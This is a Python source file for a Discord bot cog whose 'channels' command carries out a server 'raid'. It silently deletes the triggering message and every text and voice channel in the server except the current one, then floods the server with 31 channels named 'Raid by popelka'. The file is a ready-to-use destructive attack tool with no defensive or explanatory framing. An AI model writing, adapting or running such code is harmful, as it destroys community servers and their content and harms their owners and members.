# -*- coding: utf-8 -*-
import discord
from discord.ext import commands


class Channels(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def channels(self, ctx):
        guild = ctx.guild
        try:
            await ctx.message.delete()
        except:
            pass
        for channel in guild.channels:
            try:
                if channel == ctx.channel:
                    continue
                await channel.delete()
                print(f"deleted channel: {channel.name}")
            except discord.Forbidden:
                print(f"no permission to delete channel: {channel.name}")
            except Exception as e:
                print(f"error deleting channel {channel.name}: {e}")
        for channel in guild.voice_channels:
            try:
                await channel.delete()
                print(f"deleted channel: {channel.name}")
            except discord.Forbidden:
                print(f"no permission to delete channel: {channel.name}")
            except Exception as e:
                print(f"error deleting channel {channel.name}: {e}")
        guild = ctx.message.guild
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')
        await guild.create_text_channel('Raid by popelka')

async def setup(bot):
    await bot.add_cog(Channels(bot))